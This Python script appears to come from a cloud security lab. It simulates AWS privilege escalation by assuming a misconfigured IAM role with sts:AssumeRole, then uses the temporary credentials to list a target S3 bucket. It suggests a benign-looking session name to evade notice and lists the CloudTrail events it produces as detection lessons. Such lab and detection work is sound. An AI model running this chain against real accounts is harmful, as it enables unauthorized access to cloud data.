# privilege_escalation.py
# MITRE ATT&CK: T1078.004 - Valid Accounts: Cloud Accounts
# Purpose: Simulate privilege escalation via IAM role assumption
#
# Attack chain:
# 1. Confirm attacker's current limited identity
# 2. Assume the misconfigured privileged role via sts:AssumeRole
# 3. Use returned temporary credentials to perform privileged actions
# 4. Demonstrate what's now accessible that wasn't before
#
# Usage:
#   export AWS_ACCOUNT_ID="your-account-id"
#   export TARGET_BUCKET="cloud-attack-lab-target-data-your-account-id"
#   AWS_PROFILE=lab-attacker python privilege_escalation.py

import boto3
import json
import os
from botocore.exceptions import ClientError
from datetime import datetime, timezone

# -------------------------------------------------------
# CONFIGURATION — pulled from environment variables
# Never hardcode account-specific values in source code
# -------------------------------------------------------

AWS_ACCOUNT_ID = os.environ.get('AWS_ACCOUNT_ID')
TARGET_BUCKET  = os.environ.get('TARGET_BUCKET')

# Validate environment variables are set before proceeding
if not AWS_ACCOUNT_ID:
    print("[-] AWS_ACCOUNT_ID environment variable not set")
    print("    Run: export AWS_ACCOUNT_ID=your-account-id")
    exit(1)

if not TARGET_BUCKET:
    print("[-] TARGET_BUCKET environment variable not set")
    print("    Run: export TARGET_BUCKET=cloud-attack-lab-target-data-your-account-id")
    exit(1)

ROLE_ARN = f"arn:aws:iam::{AWS_ACCOUNT_ID}:role/cloud-attack-lab-privileged-role"

# -------------------------------------------------------
# STEP 1 — Confirm starting identity
# sts:GetCallerIdentity — T1033 System Owner Discovery
# Shows exactly who we are before escalation
# -------------------------------------------------------

def get_current_identity(session):
    sts = session.client('sts')
    try:
        identity = sts.get_caller_identity()
        print("\n[*] Current Identity")
        print(f"    Account: {identity['Account']}")
        print(f"    UserID:  {identity['UserId']}")
        print(f"    ARN:     {identity['Arn']}")
        return identity
    except ClientError as e:
        print(f"[-] Failed to get identity: {e.response['Error']['Code']}")
        return None

# -------------------------------------------------------
# STEP 2 — Attempt role assumption
# sts:AssumeRole is the core privilege escalation technique
# Returns temporary credentials if the role trust policy allows it
# -------------------------------------------------------

def assume_privileged_role(session, role_arn):
    sts = session.client('sts')
    try:
        print(f"\n[*] Attempting to assume role: {role_arn}")

        response = sts.assume_role(
            RoleArn=role_arn,
            # RoleSessionName identifies this session in CloudTrail logs
            # Attackers often use benign-looking names to blend in
            # Detection lesson: never rely on session names as primary signal
            RoleSessionName="legitimate-automation-session",
            # DurationSeconds controls how long temp creds last
            # 900 = 15 minutes (minimum) — sufficient for lab
            DurationSeconds=900
        )

        # Extract the three components of temporary credentials
        creds = response['Credentials']

        print(f"[+] Role assumption SUCCESSFUL")
        print(f"    Access Key ID:  {creds['AccessKeyId']}")
        print(f"    Session Token:  {creds['SessionToken'][:20]}... (truncated)")
        print(f"    Expiration:     {creds['Expiration']}")

        return creds

    except ClientError as e:
        error = e.response['Error']['Code']
        print(f"[-] Role assumption FAILED: {error}")
        if error == 'AccessDenied':
            print("    Trust policy does not allow this identity to assume the role")
        return None

# -------------------------------------------------------
# STEP 3 — Use temporary credentials to perform privileged actions
# Demonstrates what the attacker can do AFTER escalation
# that they couldn't do before
# -------------------------------------------------------

def demonstrate_escalated_access(temp_creds, target_bucket):
    print("\n[*] Creating session with temporary credentials")

    # Build a new boto3 session using the temporary credentials
    # All three components are required — key + secret + token
    # Cannot reuse attacker session — AWS treats these as separate identities
    escalated_session = boto3.Session(
        aws_access_key_id=temp_creds['AccessKeyId'],
        aws_secret_access_key=temp_creds['SecretAccessKey'],
        aws_session_token=temp_creds['SessionToken'],  # required for assumed roles
        region_name='us-east-1'
    )

    # Confirm the new identity
    # Should now show type: AssumedRole instead of IAMUser
    print("\n[*] Identity after escalation:")
    get_current_identity(escalated_session)

    # Attempt S3 access — attacker couldn't do this before escalation
    s3 = escalated_session.client('s3')

    print(f"\n[*] Attempting S3 ListBucket on target: {target_bucket}")
    try:
        response = s3.list_objects_v2(Bucket=target_bucket)
        objects = response.get('Contents', [])
        print(f"[+] S3 access SUCCESSFUL — found {len(objects)} objects:")
        for obj in objects:
            print(f"    {obj['Key']} ({obj['Size']} bytes)")
    except ClientError as e:
        print(f"[-] S3 access failed: {e.response['Error']['Code']}")

    return escalated_session

# -------------------------------------------------------
# MAIN — orchestrates the full escalation chain
# -------------------------------------------------------

def main():
    print("=" * 60)
    print("  Privilege Escalation Simulation")
    print("  MITRE ATT&CK: T1078.004")
    print(f"  Time: {datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')}")
    print("=" * 60)

    # Start with attacker's base session
    attacker_session = boto3.Session(
        profile_name='lab-attacker',
        region_name='us-east-1'
    )

    # Step 1 — confirm starting identity
    print("\n[*] Phase 1 — Reconnaissance")
    get_current_identity(attacker_session)

    # Step 2 — attempt privilege escalation
    print("\n[*] Phase 2 — Privilege Escalation")
    temp_creds = assume_privileged_role(attacker_session, ROLE_ARN)

    if temp_creds:
        # Step 3 — demonstrate escalated access
        print("\n[*] Phase 3 — Post-Escalation Access")
        demonstrate_escalated_access(temp_creds, TARGET_BUCKET)

        print("\n" + "=" * 60)
        print("[+] Privilege escalation chain complete")
        print("\n    CloudTrail events generated:")
        print("    - GetCallerIdentity  (T1033 - System Owner Discovery)")
        print("    - AssumeRole         (T1078.004 - Valid Accounts: Cloud)")
        print("    - ListObjectsV2      (post-escalation S3 access)")
        print("=" * 60)
    else:
        print("\n[-] Escalation failed — check role trust policy")

if __name__ == "__main__":
    main()